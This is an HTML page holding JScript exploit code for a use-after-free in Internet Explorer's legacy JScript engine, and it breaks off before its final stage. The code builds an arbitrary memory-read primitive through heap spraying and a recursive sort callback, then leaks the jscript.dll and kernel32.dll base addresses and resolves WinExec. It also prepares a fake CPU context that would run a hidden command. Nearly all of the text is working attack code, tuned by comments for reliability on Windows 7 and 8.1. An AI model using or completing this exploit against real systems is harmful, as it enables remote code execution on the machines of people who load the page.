<!DOCTYPE html>
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=EmulateIE8" />
<script language="JScript.Compact">

var SortArray = new Array(); // Initializing the SortArray in the global scope rather than here is fine on Windows 7 IE8 64-bit but breaks Windows 8.1 IE11 64-bit.
for(i = 0; i <= 150; i++) SortArray[i] = [0, 0]; // An array of arrays to be sorted by glitched sort method
var WindowsVersion = 8.1;

////////
////////
// Debug/timer code
////////

var EnableDebug = 0; // When debug is enabled the distinction between "stack overflow" and "out of memory" errors are lost: console always determines there to be an "out of memory" condition even though this only sppears after scoping of SortDepth is changed.
var EnableTimers = 0;
var AlertOutput = 0;
var TimeStart;
var ReadCount;

function StartTimer() {
    ReadCount = 0;
    TimeStart = new Date().getTime();
}

function EndTimer(Message) {
    var TotalTime = (new Date().getTime() - TimeStart);
    
    if(EnableTimers) {
        if(AlertOutput) {
            alert("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
        else {
            console.log("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
    }
}

function DebugLog(Message) {
    if(EnableDebug) {
        if(AlertOutput) {
            alert(Message);
        }
        else {
            console.log(Message); // In IE, console only works if devtools is open.
        }
    }
}

////////
////////
// UAF/untracked variable creation code
////////

var UntrackedVarSet;
var VarSpray;
var VarSprayCount = 20000; // 200 GcBlocks
var NameListAnchors;
var NameListAnchorCount = 0; // The larger this number the more reliable the exploit on Windows 8.1 where LFH cannot easily re-claim
var SortDepth = 0;
	
function GlitchedSort(untracked_1, untracked_2) {
	untracked_1 = VarSpray[SortDepth*2];
	untracked_2 = VarSpray[SortDepth*2 + 1];
	
	if(SortDepth > 150) {
		VarSpray = new Array(); // Erase references to sprayed vars within GcBlocks
		CollectGarbage(); // Free the GcBlocks
		UntrackedVarSet.push(untracked_1);
		UntrackedVarSet.push(untracked_2);
		return 0;
	}
	
	SortDepth += 1;

	// Exploit will fail within 64-bit WPAD on Windows 7 x64 without this try/catch in both my own (and the original) version of the exploit.

	try {
		SortArray[SortDepth].sort(GlitchedSort);
	}
	catch(ex) { // Stack overflow exception occurs around depth 250. This is specifically due to an edge case in the JS engine where a globally scoped function is in a state of recursion. Getting this to work on 64-bit WPAD meant globally initialization of the SortArray, which was contaminating the stack and affecting this recursion when initialized locally.
		//alert("Caught recursion stack overflow exception at depth " + SortDepth.toString(10));
		VarSpray = new Array(); // Erase references to sprayed vars within GcBlocks
		CollectGarbage(); // Free the GcBlocks
	}
	
	UntrackedVarSet.push(untracked_1);
	UntrackedVarSet.push(untracked_2);
	return 0;
}

function NewUntrackedVarSet() {
    SortDepth = 0;
    VarSpray = new Array();
    NameListAnchors = new Array();
    UntrackedVarSet = new Array();
    for(i = 0; i < NameListAnchorCount; i++) NameListAnchors[i] = new Object(); // Overlay must happen before var spray
    for(i = 0; i < VarSprayCount; i++) VarSpray[i] = new Object();
    CollectGarbage();
    SortArray[0].sort(GlitchedSort); // Two untracked vars will be passed to this method by the JS engine
}

////////
////////
// UAF re-claim/mutable variable code (used for arbitrary read)
////////

var AnchorObjectsBackup;
var LeakedAnchorIndex = -1;
var SizerPropName = Array(570).join('A');
var MutableVar;
var ReClaimNameList;

function ReClaimIndexNameList(Value, PropertyName) {
    CollectGarbage(); // Cleanup - note that removing this has not damaged stability of the exploit in any of my own tests and its removal significantly improved exploit performance (each arbitrary read is about twice as fast). I've left it here from maxspl0it's original version of the exploit to ensure stability.
    AnchorObjectsBackup[LeakedAnchorIndex] = null; // Delete the anchor associated with the leaked NameList allocation
    CollectGarbage(); // Free the leaked NameList
    AnchorObjectsBackup[LeakedAnchorIndex] = new Object();
    AnchorObjectsBackup[LeakedAnchorIndex][SizerPropName] = 1; // 0x17a property name size for 0x648 NameList allocation size
    AnchorObjectsBackup[LeakedAnchorIndex]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
    AnchorObjectsBackup[LeakedAnchorIndex]["\u0005"] = 1;
    AnchorObjectsBackup[LeakedAnchorIndex][PropertyName] = Value; // The mutable variable
    ReadCount++;
}

// Different strategy is possible here: repeatedly wipe the specific anchor index and attempt to re-claim it: verifying this was successful could be done by passing the intended new VAR value to this function, and then checking if the mutable var value is equal to this value after every re-claim attempt.
function ReClaimBackupNameLists(Value, PropertyName) { // This function is assuming the leaked anchor index is within the range being freed/re-allocated
    CollectGarbage(); // Cleanup
    for(i = 0; i < NameListAnchorCount; i++) AnchorObjectsBackup[i] = null;//NameListAnchorCount
    CollectGarbage(); // Free the leaked NameList
    
    for(i = 0; i < NameListAnchorCount; i++) {
        AnchorObjectsBackup[i] = new Object();
        AnchorObjectsBackup[i][SizerPropName] = 1; // 0x17a property name size for 0x648 NameList allocation size
        AnchorObjectsBackup[i]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
        AnchorObjectsBackup[i]["\u0005"] = 1;
        AnchorObjectsBackup[i][PropertyName] = Value; // The mutable variable
    }
}

function CreateVar64(type, obj_ptr_lower, obj_ptr_upper, next_ptr_lower, next_ptr_upper) {
    var charCodes = new Array();
    charCodes.push(
         // type
        type, 0, 0, 0,

         // obj_ptr
        obj_ptr_lower & 0xffff, (obj_ptr_lower >> 16) & 0xffff, obj_ptr_upper & 0xffff, (obj_ptr_upper >> 16) & 0xffff,

        // next_ptr
        next_ptr_lower & 0xffff, (next_ptr_lower >> 16) & 0xffff, next_ptr_upper & 0xffff, (next_ptr_upper >> 16) & 0xffff
        );
    return String.fromCharCode.apply(null, charCodes);
}

function LeakByte(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.lo + 2, Address.hi, 0, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return (MutableVar.length >> 15) & 0xff; // Shift to align and get the byte.
}

function LeakWord(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.lo + 2, Address.hi, 0, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
}

function LeakDword(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.lo + 2, Address.hi, 0, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var LowWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.lo + 4, Address.hi, 0, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var HighWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return LowWord + (HighWord << 16);
}

function LeakQword(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.lo + 2, Address.hi, 0, 0));
    var LowLow = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.lo + 4, Address.hi, 0, 0));
    var LowHigh = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.lo + 6, Address.hi, 0, 0));
    var HighLow = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.lo + 8, Address.hi, 0, 0));
    var HighHigh = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return from_int52(to_int52(HighLow + (HighHigh << 16), LowLow + (LowHigh << 16)));
}

function LeakObjectAddress(ObjVarAddress, ObjVarValue) { // This function does not always work, there are some edge cases. For example if a BSTR is declared var A = "123"; it works fine. However, var A = "1"; A += "23"; resuls in multiple layers of VARs referencing VARs and this function will no longer get the actual BSTR address.
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.lo + 8 + 2, ObjVarAddress.hi, 0, 0));
    var LowLow = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.lo + 8 + 4, ObjVarAddress.hi, 0, 0));
    var LowHigh = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.lo + 8 + 6, ObjVarAddress.hi, 0, 0));
    var HighLow = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.lo + 8 + 8, ObjVarAddress.hi, 0, 0));
    var HighHigh = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    var DerefObjVarAddress = from_int52(to_int52(HighLow + (HighHigh << 16), LowLow + (LowHigh << 16) + 8));
    return LeakQword(DerefObjVarAddress); // The concept here is to turn the property name (the mutable var) into a BSTR VAR pointing at its own VVAL (which starts with another, real VAR). The real VAR can be set dynamically to the address of the desired object. So there are two stages: first to read the object pointer out of the VAR within the final VVAL, and then to leak the object pointer of the VAR it is pointing to (skipping +8 over its Type field)
}

////////
////////
// PE parsing/EAT and IAT resolution code
////////

function DiveModuleBase(Address) {
    Address.lo = (Address.lo & 0xFFFF0000) + 0x4e; // Offset of "This program cannot be run in DOS mode" in PE header.
    
    while(true) {
        if(LeakWord(Address) == 0x6854) { // 'hT'
            if(LeakWord(from_int52(to_int52(Address.hi, Address.lo + 2))) == 0x7369) { // 'si'

                return from_int52(to_int52(Address.hi, Address.lo - 0x4e));
            }
        }
        
        Address.lo -= 0x10000;
    }
    
    return 0;
}

function ResolveExport(ModuleBase, TargetExportNameTable) {
    var FileHdrRva = LeakDword(from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + 0x3c)));
    var ExportDataDirAddress = from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + FileHdrRva + 0x88));
    
    if(ExportDataDirAddress) {
        var EATRva = LeakDword(ExportDataDirAddress);
        var TotalExports = LeakDword(from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + EATRva + 0x14)));
        var AddressRvas = LeakDword(from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + EATRva + 0x1C)));
        var NameRvas = LeakDword(from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + EATRva + 0x20)));
        var OrdinalRvas = LeakDword(from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + EATRva + 0x24)));
        var MaxIndex = TotalExports;
        var MinIndex = 0;
        var CurrentIndex = Math.floor(TotalExports / 2);
        var TargetTableIndex = 0;
        var BinRes = 0;
        
        while(TotalExports) { 
            var CurrentNameRva = LeakDword(from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + NameRvas + 4*CurrentIndex)));

            while (TargetTableIndex < TargetExportNameTable.length) {
                CurrentNameWord = LeakWord(from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + (CurrentNameRva + (4 * TargetTableIndex)))));
                var ExportNameWord = (TargetExportNameTable[TargetTableIndex] & 0x0000FFFF);
                var SanitizedCurrentNameWord = NullSanitizeWord(CurrentNameWord);
                BinRes = BinaryCmp(ExportNameWord, SanitizedCurrentNameWord);
                //DebugLog("Compaaring 0x" + ExportNameWord.toString(16) + " to sanitized 0x" + SanitizedCurrentNameWord.toString(16) + " result: " + BinRes.toString(10));

                if(!BinRes) {
                    //DebugLog("Matched!");
                    ExportNameWord = ((TargetExportNameTable[TargetTableIndex] & 0xFFFF0000) >> 16);
                    
                    if(ExportNameWord != 0) { // Special case: final WORD of name array is 0, consider this a match
                        CurrentNameWord = LeakWord(from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + (CurrentNameRva + (4 * TargetTableIndex)) + 2)));
                        SanitizedCurrentNameWord = NullSanitizeWord(CurrentNameWord);
                        BinRes = BinaryCmp(ExportNameWord, SanitizedCurrentNameWord);
                        //DebugLog("Compaaring 0x" + ExportNameWord.toString(16) + " to sanitized 0x" + SanitizedCurrentNameWord.toString(16) + " result: " + BinRes.toString(10) + " at index " + TargetTableIndex.toString(10));

                        if(!BinRes) {
                            //DebugLog("Matched!");
                            
                            if((TargetTableIndex + 1) >= TargetExportNameTable.length) {
                                Ordinal = LeakWord(from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + OrdinalRvas + 2*CurrentIndex)));
                                MainExport = from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + LeakDword(from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + AddressRvas + 4*Ordinal)))));
                                //DebugLog("Match case one");
                                return MainExport;
                            }
                            else {
                                //DebugLog("Chunks are equal but not at final index, current is: " + TargetTableIndex.toString(10));
                            }
                            
                            TargetTableIndex++;
                        }
                        else {
                            TargetTableIndex = 0;
                            break;
                        }
                    }
                    else {
                        if((TargetTableIndex + 1) >= TargetExportNameTable.length) {
                            Ordinal = LeakWord(from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + OrdinalRvas + (2 * CurrentIndex))));
                            MainExport = from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + LeakDword(from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + AddressRvas + (4 * Ordinal))))));
                            DebugLog("Match case two");
                            return MainExport;
                        }
                        else {
                            //alert("Fatal error during export lookup: target export name array contained a NULL byte not at the end of its final element");
                        }
                    }
                }
                else {
                    TargetTableIndex = 0;
                    break;
                }
            }
            
            if(BinRes == 1) { // Target is greater than what it was compared to: reduce current index
                if(MaxIndex == CurrentIndex) {
                    DebugLog("Failed to find export: index hit max");
                    break;
                }
                
                MaxIndex = CurrentIndex;
                CurrentIndex = Math.floor((CurrentIndex + MinIndex) / 2);
            } 
            else if (BinRes == -1) { // Target is less than what it was compared to: enhance current index
                if(MinIndex == CurrentIndex) {
                    DebugLog("Failed to find export: index hit min");
                    break;
                }
                
                MinIndex = CurrentIndex;
                CurrentIndex = Math.floor((CurrentIndex + MaxIndex) / 2);
            }
            
            if(CurrentIndex == MaxIndex && CurrentIndex == MinIndex) {
                DebugLog("Failed to find export: current, min and max indexes are all equal");
                break;
            }
        }
    }
    
    DebugLog("Nothing found");
    return 0;
}

function ExtractBaseFromImports(ModuleBase, TargetModuleNameTable) { // Grab the first IAT entry of a function within the specified module
    var ExtractedAddresss = 0;
    var FileHdrRva = LeakDword(from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + 0x3c)));
    var ImportDataDirAddress = from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + FileHdrRva + 0x90)); // Import data directory
    var ImportRva = LeakDword(ImportDataDirAddress);
    var ImportSize = LeakDword(from_int52(to_int52(ImportDataDirAddress.hi, ImportDataDirAddress.lo + 0x4))); // Get the size field of the import data dir
    var DescriptorAddress = from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + ImportRva));
    
    while(ImportSize != 0) {
        NameRva = LeakDword(from_int52(to_int52(DescriptorAddress.hi, DescriptorAddress.lo + 0xc))); // 0xc is the offset to the module name pointer
        
        if(NameRva != 0) {
            if(StrcmpLeak(TargetModuleNameTable, from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + NameRva)))) {
                ThunkRva = LeakDword(from_int52(to_int52(DescriptorAddress.hi, DescriptorAddress.lo + 0x10)));
                ExtractedAddresss = LeakQword(from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + ThunkRva + 8))); // +8 since __imp___C_specific_handler can cause issues when imported in some jscript instances
                break;
            }
            
            ImportSize -= 0x14;
            DescriptorAddress.lo += 0x14; // Next import descriptor in array
        }
        else {
            break;
        }
    }
    
    return ExtractedAddresss;
}

////////
////////
// Misc. helper functions
////////

function NullSanitizeWord(StrWord) {
    var Sanitized = 0;
    
    if(StrWord != 0) {
        if((StrWord & 0x00FF) == 0) {
            Sanitized = 0; // First byte is NULL, end of the string.
        }
        else {
            Sanitized = StrWord;
        }
    }
    
    return Sanitized;
}

function BinaryCmp(TargetNum, CmpNum) { // return -1 for TargetNum being greater, 0 for equal, 1 for CmpNum being greater
    if(TargetNum == CmpNum) {
        return 0;
    }
    
    while(true) {
        if((TargetNum & 0xff) > (CmpNum & 0xff)) {
            return -1;
        }
        else if((TargetNum & 0xff) < (CmpNum & 0xff)) {
            return 1;
        }
        
        TargetNum = TargetNum >> 8;
        CmpNum = CmpNum >> 8;
    }
}

function DwordToUnicode(Dword) {
    var Unicode = String.fromCharCode(Dword & 0xFFFF);
    Unicode += String.fromCharCode(Dword >> 16);
    return Unicode;
}

function TableToUnicode(Table) {
    var Unicode = "";
    
    for (i = 0; i < Table.length; i++) {
        Unicode += DwordToUnicode(Table[i]);
    }

    return Unicode;
}

function ConvertDwordArrayToBytes(DwordArray) {
    var ByteArray = [];
    
    for (i = 0; i < DwordArray.length; i++) {
        ByteArray.push(DwordArray[i] & 0xffff);
        ByteArray.push((DwordArray[i] & 0xffff0000) >> 16);
    }
    
    return String.fromCharCode.apply(null, ByteArray);
}

function StrcmpLeak(StrDwordTable, LeakAddress) { // Compare two strings between an array of WORDs and a string at a memory address
    var TargetTableIndex = 0;
    
    while (TargetTableIndex < StrDwordTable.length) {
        var LeakStrWord = LeakWord(from_int52(to_int52(LeakAddress.hi, LeakAddress.lo + (4 * TargetTableIndex))));
        var SanitizedStrWord = NullSanitizeWord(LeakStrWord);
        var TableWord = (StrDwordTable[TargetTableIndex] & 0x0000FFFF);
        
        //DebugLog("StrcmpLeak comparing 0x" + TableWord.toString(16) + " to 0x" + SanitizedStrWord.toString(16) + " original word " + LeakStrWord.toString(16));
        
        if(TableWord == SanitizedStrWord) {
            //DebugLog("Words maatched. Leaking second word");
            LeakStrWord = LeakWord(from_int52(to_int52(LeakAddress.hi, LeakAddress.lo + (4 * TargetTableIndex) + 2)));
            SanitizedStrWord = NullSanitizeWord(LeakStrWord);
            TableWord = ((StrDwordTable[TargetTableIndex] & 0xFFFF0000) >> 16);
            //DebugLog("StrcmpLeak comparing 0x" + TableWord.toString(16) + " to 0x" + SanitizedStrWord.toString(16));
            
            if(TableWord == SanitizedStrWord) {
                if((TargetTableIndex + 1) >= StrDwordTable.length) {
                    return true;
                }
                else {
                    //DebugLog("Chunks are equal but not at final index, current is: " + TargetTableIndex.toString(10) + " DWORD array length is: " + StrDwordTable.length.toString(10));
                }
                
                TargetTableIndex++;
            }
            else {
                break;
            }
        }
        else {
            break;
        }
    }
    
    return false;
}

////////
////////
// Primary high level exploit logic
////////

function to_int52(hi, lo) {
    /* range checking */
    if ((lo !== lo|0) && (lo !== (lo|0)+4294967296))
        DebugLog ("lo out of range: "+lo.toString(16));
    if (hi !== hi|0 && hi >= 1048576)
        DebugLog ("hi out of range: "+hi.toString(16));

    if (lo < 0)
    lo += 4294967296;

    return hi * 4294967296 + lo;
}

function from_int52(i) {
    var lo = i | 0;
    if (lo < 0)
    lo += 4294967296;

    var hi = i - lo;
    hi /= 4294967296;
    if ((hi < 0) || (hi >= 1048576))
        DebugLog("not an int52: "+i.toString(16));
    return { lo: lo, hi: hi };
}

function generate_gadget_string(gadget) {
    return String.fromCharCode.apply(null, [gadget.lo & 0xffff, (gadget.lo >> 16) & 0xffff, gadget.hi & 0xffff, (gadget.hi >> 16) & 0xffff]);
}

function generate_context(command_address, leaked_stack_ptr, kernel32_winexec_export) {
    return "\u0000\u0000\u0000\u0000" + // P3Home
    "\u0000\u0000\u0000\u0000" + // P4Home
    "\u0000\u0000\u0000\u0000" + // P5Home
    "\u0000\u0000\u0000\u0000" + // P6Home
    "\u0003\u0010" + // ContextFlags
    "\u0000\u0000" + // MxCsr
    "\u0033" + // SegCs
    "\u0000" + // SegDs
    "\u0000" + // SegEs
    "\u0000" + // SegFs
    "\u0000" + // SegGs
    "\u002b" + // SegSs
    "\u0246\u0000" + // EFlags
    "\u0000\u0000\u0000\u0000" + // Dr0 - Prevents EAF too!
    "\u0000\u0000\u0000\u0000" + // Dr1
    "\u0000\u0000\u0000\u0000" + // Dr2
    "\u0000\u0000\u0000\u0000" + // Dr3
    "\u0000\u0000\u0000\u0000" + // Dr6
    "\u0000\u0000\u0000\u0000" + // Dr7
    "\u0000\u0000\u0000\u0000" + // Rax
    //"\u1111\u2222\u3333\u4444" + // Rax
    generate_gadget_string(command_address) + // Rcx - Command pointer
    "\u0000\u0000\u0000\u0000" + // Rdx - SW_HIDE
    "\u0000\u0000\u0000\u0000" + // Rbx
    generate_gadget_string(leaked_stack_ptr) + // Rsp - Leaked Stack pointer
    "\u0000\u0000\u0000\u0000" + // Rbp
    "\u0000\u0000\u0000\u0000" + // Rsi
    "\u0000\u0000\u0000\u0000" + // Rdi
    "\u0040\u0000\u0000\u0000" + // R8
    "\u0000\u0000\u0000\u0000" + // R9
    "\u0000\u0000\u0000\u0000" + // R10
    "\u0000\u0000\u0000\u0000" + // R11
    "\u0000\u0000\u0000\u0000" + // R12
    "\u0000\u0000\u0000\u0000" + // R13
    "\u0000\u0000\u0000\u0000" + // R14
    "\u0000\u0000\u0000\u0000" + // R15
    generate_gadget_string(kernel32_winexec_export); // Rip - WinExec() call
}

var LFHBlocks = new Array(); // If this is local rather than global the exploit does not work on Windows 8.1 IE11 64-bit

function Exploit() {
    // Initialization
    
    if(WindowsVersion <= 7) {
        ReClaimNameList = ReClaimIndexNameList;
        NameListAnchorCount = 20000;
    }
    else {
        ReClaimNameList = ReClaimBackupNameLists;
        NameListAnchorCount = 40000; // The larger this number the more reliable the exploit on Windows 8.1 where LFH cannot easily re-claim
    }
    
    StartTimer();

    // Trigger LFH for a size of 0x648

    for(i = 0; i < 50; i++) {
        Temp = new Object();
        Temp[Array(570).join('A')] = 1; // Property name size of 0x239 (569 chars with a default +1 added as a terminator) will produce the desired re-claim allocation size.
        LFHBlocks.push(Temp);
    }
    
    EndTimer("LFH");
    
    // New set of untracked vars in freed GcBlock
    
    StartTimer();
    NewUntrackedVarSet(); // Consistently 460 total
    DebugLog("Total untracked variables: " + UntrackedVarSet.length.toString(10));
    
    // Re-claim with type confusion NameLists
    
    for(i = 0; i < NameListAnchorCount; i++) {
        NameListAnchors[i][SizerPropName] = 1; // 0x17a property name size for 0x648 NameList allocation size
        NameListAnchors[i]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
        NameListAnchors[i]["\u0005"] = 1; // This ends up in the VVAL hash/name length to be type confused with an integer VAR
        NameListAnchors[i]["C"] = i; // The address of this VVAL will be leaked
    }
    
    EndTimer("Infoleak VAR creation + re-claim");
    
    // Leak final VVAL address from one of the NameLists
    
    StartTimer();
    AnchorObjectsBackup = NameListAnchors; // Prevent it from being freed and losing our leaked pointer
    EndTimer("Anchor backup");
    StartTimer();
    
    var LeakedVvalAddress = undefined;
    
    for(i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number" && UntrackedVarSet[i] % 1 != 0) {
            LeakedVvalAddress = (UntrackedVarSet[i] / 4.9406564584124654E-324); // This division just converts the float into an easy-to-read 32-bit number
            break;
        }
    }
    
    LeakedVvalAddress = from_int52(LeakedVvalAddress); // In Windows 7, the leaked heap pointer could always be encoded in 32-bits. On Windows 8.1 IE11, it often consumes more. By leaking the final VVAL pointer with a double float we can get the bits we need. Experimenting with this I learned all JS numbers are 52 bits in size.
    

    
    EndTimer("Infoleak VAR scan");
    DebugLog("leaked final VVAL address of 0x" + LeakedVvalAddress.toString(16) + " low: 0x" + LeakedVvalAddress.lo.toString(16) + " high: 0x" + LeakedVvalAddress.hi.toString(16) + " combined: 0x" + LeakedVvalAddress.hi.toString(16) + LeakedVvalAddress.lo.toString(16));
    
    
    if(LeakedVvalAddress != 0) {
        var PrimaryVvalPropName = "AAAAAAAA"; // 16 bytes for size of GcBlock double linked list pointers

        for(i=0; i < 46; i++) {
            PrimaryVvalPropName += CreateVar64(0x80, LeakedVvalAddress.lo, LeakedVvalAddress.hi, 0, 0); // Type 0x80 is a VAR reference
        }
        
        //PrimaryVvalPropName += "AAAAAAAAA";
        //PrimaryVvalPropName = PrimaryVvalPropName.substr(0, PrimaryVvalPropName.length);
        while(PrimaryVvalPropName.length < 0x239) PrimaryVvalPropName += "A";
        //DebugLog("Primary VVAL property name length: 0x" + PrimaryVvalPropName.length.toString(16));
        //while(PrimaryVvalPropName.length < 0x17a) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to a length of 0x17a

        // New set of untracked vars in freed GcBlock
        
        StartTimer();
        NewUntrackedVarSet();
        
        // Re-claim with leaked VVAL address vars (to be dereferenced for anchor object index extraction)
        
        for(i = 0; i < NameListAnchorCount; i++) {
            NameListAnchors[i][PrimaryVvalPropName] = 1;
            //NameListAnchors[i]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
            //NameListAnchors[i]["\u0005"] = 1; // This ends up in the VVAL hash/name length to be type confused with an integer VAR
            //NameListAnchors[i]["C"] = i; // The address of this VVAL will be leaked
        }
        
        EndTimer("Anchor index VAR creation + re-claim");
        StartTimer();
        
        // Extract NameList anchor index through untracked var dereference to leaked VVAL prefix VAR
        
        var LeakedVvalVar;

        for(i = 0; i < UntrackedVarSet.length; i++) {
            if(typeof UntrackedVarSet[i] === "number") {
                LeakedAnchorIndex = parseInt(UntrackedVarSet[i] + ""); // Attempting to access the untracked var without parseInt will fail ("null or not an object")
                LeakedVvalVar = UntrackedVarSet[i]; // The + "" trick alone does not seeem to be enough to populate this with the actual value
                break;
            }
        }
        
        //DebugLog("Leaked anchor object index: " + LeakedAnchorIndex.toString(16));
        
        // Verify that the VAR within the leaked VVAL can be influenced by directly freeing/re-claiming the NameList associated with the leaked NameList anchor object (whose index is now known)
        
        ReClaimNameList(0x11, "A");
        
        if(LeakedVvalVar + "" == 0x11) {
            // Create the mutable variable which will be used throughout the remainder of the exploit
            
            EndTimer("Anchor index VAR scan");
            //DebugLog("Leaked anchor object re-claim verification success");
        
            ReClaimNameList(0, CreateVar64(0x3, 0x22, 0, 0, 0));
            
            var PrimaryVvalPropName = "AAAAAAAA"; // 2 wide chars (4 bytes) plus the 4 byte BSTR length gives 8 bytes: the size of the two GcBlock linked list pointers. Everything after this point can be fake VARs and a tail padding.

            for(i=0; i < 46; i++) {
                PrimaryVvalPropName += CreateVar64(0x80, LeakedVvalAddress.lo + 0x40, LeakedVvalAddress.hi, 0, 0); // +0x40 is the offset to property name field of 64-bit VVAL struct. Type 0x80 is a VAR reference
            }
            
            while(PrimaryVvalPropName.length < 0x239) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to correct length
            
            // New set of untracked vars in freed GcBlock
            
            StartTimer();
            NewUntrackedVarSet();
            
            // Re-claim with leaked VVAL name property address vars (this is the memory address of the mutable variable that will be created)
            
            for(i = 0; i < NameListAnchorCount; i++) {
                NameListAnchors[i][PrimaryVvalPropName] = 1;
            }
            
            EndTimer("Mutable VAR reference creation + re-claim");
            StartTimer();
            
            for(i = 0; i < UntrackedVarSet.length; i++) {
                if(typeof UntrackedVarSet[i] === "number") {
                    if(UntrackedVarSet[i] + "" == 0x22) {
                        MutableVar = UntrackedVarSet[i];
                        break;
                    }
                }
            }
            
            // Verify the mutable var can be changed via simple re-claim
            
            ReClaimNameList(0, CreateVar64(0x3, 0x33, 0, 0, 0));
            
            if(MutableVar + "" == 0x33) {
                // Test arbitrary read primitive
                
                EndTimer("Mutable VAR reference scan");
                //DebugLog("Verified mutable variable modification via re-claim");
                var MutableVarAddress = from_int52(to_int52(LeakedVvalAddress.hi, LeakedVvalAddress.lo + 0x40));
                var FirstByte = LeakByte(MutableVarAddress);
                //alert("Read byte 0x" + FirstByte.toString(16) + " from 0x" + MutableVarAddress.hi.toString(16) + MutableVarAddress.lo.toString(16));
                if(LeakByte(MutableVarAddress) == 0x8) { // Change mutable var to a BSTR pointing at itself.
                    // Derive jscript.dll base from leaked Object vtable
                
                    //DebugLog("Memory leak test successful");
                    StartTimer();
                    
                    var DissectedObj = new Object();
                    var ObjectAddress = LeakObjectAddress(LeakedVvalAddress, DissectedObj);
                    var VtableAddress = LeakQword(ObjectAddress);
                    
                    //DebugLog("Leaked vtable address: 0x" + VtableAddress.hi.toString(16) + VtableAddress.lo.toString(16));
                    
                    var JScriptBase = DiveModuleBase(VtableAddress);
                    
                    if(JScriptBase != 0) {
                        // Extract the first Kernel32.dll import from Jscript.dll IAT to dive for its base
                        
                        EndTimer("JScriptBase base leak");
                        DebugLog("Leaked JScript base address: 0x" + JScriptBase.hi.toString(16) + JScriptBase.lo.toString(16));
                        
                        StartTimer();
                        var Kernel32ImportX = ExtractBaseFromImports(JScriptBase, [0x4e52454b, 0x32334c45]); // 0x4e52454b, 0x32334c45
                        
                        if(Kernel32ImportX != 0) {
                            EndTimer("Kernel32 random import leak");
                            StartTimer();
                            
                            var Kernel32Base = DiveModuleBase(Kernel32ImportX);
                            
                            if(Kernel32Base != 0) {
                                EndTimer("Kernel32.dll base resolution");
                                //DebugLog("Successfully resolved kernel32.dll base at 0x" + Kernel32Base.hi.toString(16) + Kernel32Base.lo.toString(16));
                                var WinExecAddress = ResolveExport(Kernel32Base, [0x456e6957]);
                                //DebugLog("Successfully resolved WinExec at at 0x" + WinExecAddress.hi.toString(16) + WinExecAddress.lo.toString(16));
                                StartTimer();
                                var MsvcrtImportX = ExtractBaseFromImports(JScriptBase, [0x6376736d, 0x642e7472]);
                                var MsvcrtBase = DiveModuleBase(MsvcrtImportX);
                                EndTimer("MsvcrtBase base leak");
                                
                                //DebugLog("Msvcrt base: 0x" + MsvcrtBase.hi.toString(16) + MsvcrtBase.lo.toString(16));
